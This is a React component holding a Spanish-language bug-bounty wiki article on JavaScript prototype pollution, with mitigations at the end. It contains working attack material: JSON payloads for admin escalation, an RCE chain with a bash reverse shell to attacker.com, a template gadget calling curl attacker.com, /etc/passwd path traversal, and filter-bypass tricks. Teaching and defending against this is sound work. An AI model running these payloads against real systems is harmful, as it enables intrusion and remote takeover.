/**
 * PROTOTYPE POLLUTION
 * Contaminar prototipos de JavaScript para RCE
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Code2, AlertOctagon, Shield, Zap, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function PrototypePollutionContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="Prototype Pollution - Contaminar el ADN de JavaScript">
        <Paragraph>
          <Strong>Prototype Pollution</Strong> es una vulnerabilidad única de JavaScript donde un atacante 
          modifica <InlineCode>Object.prototype</InlineCode>, afectando TODOS los objetos de la aplicación. 
          Puede escalar a <Strong>RCE</Strong>, <Strong>XSS</Strong>, o <Strong>authentication bypass</Strong>.
        </Paragraph>

        <AlertDanger title="Impacto Crítico">
          <ul className="mt-2 space-y-1">
            <ListItem>🔥 RCE en Node.js (child_process.execSync)</ListItem>
            <ListItem>🎯 Authentication bypass (isAdmin = undefined)</ListItem>
            <ListItem>💣 XSS persistente (innerHTML contamination)</ListItem>
            <ListItem>🚪 Path traversal (file paths manipulation)</ListItem>
            <ListItem>⚙️ DoS (alterar comportamiento global)</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="fundamentos" title="1. ¿Cómo Funciona la Contaminación?">
        <Paragraph>
          En JavaScript, todos los objetos heredan de <InlineCode>Object.prototype</InlineCode>. 
          Si modificamos este prototype, TODOS los objetos se ven afectados.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="Demostración del concepto"
          code={`// Todos los objetos heredan de Object.prototype
const obj1 = {};
const obj2 = {};

console.log(obj1.isAdmin);  // undefined
console.log(obj2.isAdmin);  // undefined

// ⚠️ Contaminar el prototype
Object.prototype.isAdmin = true;

// Ahora TODOS los objetos tienen isAdmin = true
console.log(obj1.isAdmin);  // true ← ¡Contaminado!
console.log(obj2.isAdmin);  // true ← ¡Contaminado!

const obj3 = {};
console.log(obj3.isAdmin);  // true ← ¡Nuevos objetos también!`}
        />

        <HighlightBox color="red">
          <Strong>Problema:</Strong> Si una aplicación verifica <InlineCode>if (user.isAdmin)</InlineCode>, 
          un atacante puede contaminar el prototype para que TODOS los usuarios sean admin.
        </HighlightBox>
      </Section>

      <Section id="codigo-vulnerable" title="2. Código Vulnerable - Merge Recursivo">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Función merge sin sanitización"
          code={`// Función común en librerías como lodash, jQuery
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      // ❌ VULNERABLE - No verifica __proto__
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Código vulnerable en aplicación
const userPreferences = {};
const userInput = JSON.parse(req.body.preferences);

// ❌ VULNERABLE - Merging user input
merge(userPreferences, userInput);`}
        />

        <CodeBlock
          language="json"
          title="Payload malicioso"
          code={`{
  "theme": "dark",
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
}`}
        />

        <TerminalOutput title="Resultado de la contaminación">
          {`// Después del merge:
Object.prototype.isAdmin === true  ✓
Object.prototype.role === "admin"   ✓

// TODOS los objetos ahora tienen estas propiedades:
const normalUser = {};
console.log(normalUser.isAdmin);  // true ← ¡CONTAMINATED!
console.log(normalUser.role);     // "admin" ← ¡CONTAMINATED!`}
        </TerminalOutput>
      </Section>

      <Section id="rce-nodejs" title="3. Escalación a RCE en Node.js">
        <Paragraph>
          El objetivo final es <Strong>Remote Code Execution</Strong>. En Node.js, podemos 
          contaminar propiedades que luego son usadas en <InlineCode>child_process</InlineCode>.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - child_process con options contaminadas"
          code={`const { execSync } = require('child_process');
const merge = require('lodash.merge');  // Versión vulnerable

// Endpoint vulnerable
app.post('/api/execute', (req, res) => {
  const userConfig = {};
  
  // ❌ VULNERABLE - Merge de user input
  merge(userConfig, req.body.config);
  
  // Ejecutar comando con options
  const options = {};
  const output = execSync('ls -la', options);
  
  res.send(output);
});`}
        />

        <CodeBlock
          language="json"
          title="Payload RCE - Contaminar execSync options"
          code={`POST /api/execute
Content-Type: application/json

{
  "config": {
    "__proto__": {
      "shell": "/bin/bash",
      "env": {
        "NODE_OPTIONS": "--require /tmp/evil.js"
      }
    }
  }
}`}
        />

        <CodeBlock
          language="bash"
          title="Crear backdoor persistente"
          code={`# 1. Crear payload malicioso
cat > /tmp/evil.js << 'EOF'
const { execSync } = require('child_process');

// Reverse shell
execSync('bash -i >& /dev/tcp/attacker.com/4444 0>&1');
EOF

# 2. Enviar payload de prototype pollution
curl -X POST https://target.com/api/execute \\
  -H "Content-Type: application/json" \\
  -d '{
    "config": {
      "__proto__": {
        "env": {
          "NODE_OPTIONS": "--require /tmp/evil.js"
        }
      }
    }
  }'

# 3. En siguiente ejecución de child_process, NODE_OPTIONS carga evil.js
# Resultado: Reverse shell ejecutado`}
        />
      </Section>

      <Section id="gadgets" title="4. Gadget Chains - Encontrar Vectores">
        <Paragraph>
          Un <Strong>gadget</Strong> es un fragmento de código existente que puede ser 
          weaponizado tras prototype pollution. Herramientas como <Strong>ppmap</Strong> los detectan.
        </Paragraph>

        <Subsection title="Gadget 1: Template Engines">
          <CodeBlock
            language="javascript"
            title="Gadget en Handlebars/Pug"
            code={`// Código vulnerable en aplicación
const Handlebars = require('handlebars');

app.get('/profile', (req, res) => {
  const template = Handlebars.compile('<h1>{{name}}</h1>');
  
  // ❌ Si prototype está contaminado con __proto__.type = "Program"
  const html = template({ name: req.query.name });
  
  res.send(html);
});`}
          />

          <CodeBlock
            language="json"
            title="Payload - XSS via template gadget"
            code={`POST /api/settings
{
  "preferences": {
    "__proto__": {
      "type": "Program",
      "body": [{
        "type": "MustacheStatement",
        "path": {
          "type": "PathExpression",
          "original": "constructor",
          "data": false
        },
        "params": [{
          "type": "StringLiteral",
          "value": "return global.process.mainModule.constructor._load('child_process').execSync('curl attacker.com/xss')"
        }]
      }]
    }
  }
}`}
          />
        </Subsection>

        <Subsection title="Gadget 2: Express.js sendFile">
          <CodeBlock
            language="javascript"
            title="Path traversal via pollution"
            code={`app.get('/download', (req, res) => {
  const options = {};
  
  // ❌ Si __proto__.root está contaminado
  res.sendFile(req.query.file, options);
});

// Payload:
{
  "__proto__": {
    "root": "/etc"
  }
}

// GET /download?file=passwd
// Resultado: Descarga /etc/passwd en lugar de directorio seguro`}
          />
        </Subsection>
      </Section>

      <Section id="deteccion" title="5. Detección Automática con ppmap">
        <CodeBlock
          language="bash"
          title="Instalar y usar ppmap"
          code={`# Instalar ppmap
npm install -g ppmap

# Escanear aplicación en busca de gadgets
ppmap --target https://target.com \\
      --method POST \\
      --data '{"preferences": "__INJECT__"}' \\
      --headers "Content-Type: application/json"

# ppmap probará payloads como:
# {"preferences": {"__proto__": {"polluted": "value"}}}
# {"preferences": {"constructor": {"prototype": {"polluted": "value"}}}}

# Output:
[+] Prototype Pollution detected!
[+] Gadgets found:
    - child_process.execSync (RCE)
    - express.res.sendFile (Path Traversal)
    - handlebars.compile (XSS)`}
        />

        <AlertTip>
          <Strong>ppmap</Strong> automáticamente prueba diferentes técnicas de pollution 
          y detecta gadgets explotables en el código.
        </AlertTip>
      </Section>

      <Section id="bypass-filters" title="6. Bypass de Filtros">
        <Subsection title="Técnica 1: constructor.prototype">
          <CodeBlock
            language="json"
            title="Bypass de blacklist de '__proto__'"
            code={`// Si la app bloquea __proto__, usar constructor.prototype
{
  "preferences": {
    "constructor": {
      "prototype": {
        "isAdmin": true
      }
    }
  }
}

// Equivalente a __proto__.isAdmin = true`}
          />
        </Subsection>

        <Subsection title="Técnica 2: Array Notation">
          <CodeBlock
            language="json"
            title="Bypass con notación de array"
            code={`// Si JSON.parse es usado, probar array notation
{
  "preferences": {
    "__proto__": ["polluted"],
    "constructor": {
      "prototype": {
        "polluted": "value"
      }
    }
  }
}`}
          />
        </Subsection>

        <Subsection title="Técnica 3: Unicode Encoding">
          <CodeBlock
            language="javascript"
            title="Obfuscar __proto__ con Unicode"
            code={`// Usar escape sequences
const payload = {
  "\\u005f\\u005f\\u0070\\u0072\\u006f\\u0074\\u006f\\u005f\\u005f": {
    "isAdmin": true
  }
};

// \\u005f\\u005f\\u0070\\u0072\\u006f\\u0074\\u006f\\u005f\\u005f === "__proto__"`}
          />
        </Subsection>
      </Section>

      <Section id="explotacion-burp" title="7. Explotación con Burp Suite">
        <CodeBlock
          language="http"
          title="Request original capturado"
          code={`POST /api/user/preferences HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "theme": "dark",
  "language": "en"
}`}
        />

        <CodeBlock
          language="http"
          title="Payload modificado en Burp Repeater"
          code={`POST /api/user/preferences HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "theme": "dark",
  "__proto__": {
    "isAdmin": true,
    "role": "admin",
    "canDelete": true
  }
}`}
        />

        <TerminalOutput title="Verificar contaminación">
          {`# En navegador, ejecutar en consola:
const testObj = {};
console.log(testObj.isAdmin);  // true ← ¡POLLUTED!

# Ahora probar acciones de admin:
fetch('/admin/deleteUser/123', { method: 'DELETE' })

# Si la app verifica user.isAdmin sin Object.hasOwnProperty,
# el request tendrá éxito`}
        </TerminalOutput>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Prevenir Prototype Pollution">
          Implementar TODAS estas protecciones.
        </AlertDanger>

        <Subsection title="1. Usar Object.create(null)">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Objetos sin prototype"
            code={`// ✅ SEGURO - Object.create(null) no hereda de Object.prototype
const safeConfig = Object.create(null);

// Merging en objeto sin prototype
function safeMerge(target, source) {
  const safeTarget = Object.create(null);
  
  for (let key in source) {
    // Verificar ownership
    if (source.hasOwnProperty(key)) {
      safeTarget[key] = source[key];
    }
  }
  
  return safeTarget;
}

// Ahora prototype pollution no afecta:
const result = safeMerge({}, {
  "__proto__": { "isAdmin": true }
});

const test = {};
console.log(test.isAdmin);  // undefined ← ¡NO CONTAMINADO!`}
          />
        </Subsection>

        <Subsection title="2. Validar Keys Peligrosas">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Blacklist de keys"
            code={`const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];

function secureMerge(target, source) {
  for (let key in source) {
    // ✅ Verificar key peligrosa
    if (DANGEROUS_KEYS.includes(key)) {
      throw new Error(\`Dangerous key detected: \${key}\`);
    }
    
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = {};
      secureMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  
  return target;
}

// Payload bloqueado:
try {
  secureMerge({}, { "__proto__": { "isAdmin": true } });
} catch (e) {
  console.error(e.message);  // "Dangerous key detected: __proto__"
}`}
          />
        </Subsection>

        <Subsection title="3. Usar Object.freeze">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Congelar prototype"
            code={`// ✅ SEGURO - Congelar Object.prototype al inicio de la app
Object.freeze(Object.prototype);

// Ahora intentos de pollution fallan silenciosamente:
Object.prototype.isAdmin = true;

const test = {};
console.log(test.isAdmin);  // undefined ← ¡PROTEGIDO!

// También congelar Array y otros prototypes
Object.freeze(Array.prototype);
Object.freeze(String.prototype);`}
          />
        </Subsection>

        <Subsection title="4. JSON Schema Validation">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Validar estructura de JSON"
            code={`const Ajv = require('ajv');
const ajv = new Ajv();

const schema = {
  type: 'object',
  properties: {
    theme: { type: 'string' },
    language: { type: 'string' }
  },
  additionalProperties: false  // ✅ No permitir keys extras
};

const validate = ajv.compile(schema);

app.post('/api/preferences', (req, res) => {
  // ✅ Validar antes de procesar
  if (!validate(req.body)) {
    return res.status(400).json({
      error: 'Invalid schema',
      details: validate.errors
    });
  }
  
  // Ahora es seguro procesar
  updatePreferences(req.body);
});

// Payload con __proto__ será rechazado:
// {"theme": "dark", "__proto__": {...}} → Error: additionalProperties`}
          />
        </Subsection>

        <Subsection title="5. Usar Librerías Seguras">
          <AlertInfo>
            <Strong>Librerías con protección nativa:</Strong>
            <ul className="mt-2 space-y-1">
              <ListItem>✅ <InlineCode>lodash &gt;= 4.17.21</InlineCode> (parcheado)</ListItem>
              <ListItem>✅ <InlineCode>just-merge</InlineCode> (seguro por diseño)</ListItem>
              <ListItem>✅ <InlineCode>deepmerge</InlineCode> con options.isMergeableObject</ListItem>
              <ListItem>❌ <InlineCode>lodash &lt; 4.17.11</InlineCode> (VULNERABLE)</ListItem>
              <ListItem>❌ <InlineCode>jQuery.extend</InlineCode> (VULNERABLE)</ListItem>
            </ul>
          </AlertInfo>

          <CodeBlock
            language="bash"
            title="Actualizar dependencias"
            code={`# Verificar versiones vulnerables
npm audit

# Actualizar lodash
npm install lodash@latest

# O usar alternativa segura
npm install just-merge`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: OAuth Attacks</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/oauth-attacks`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar flujos OAuth 2.0 mal implementados</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
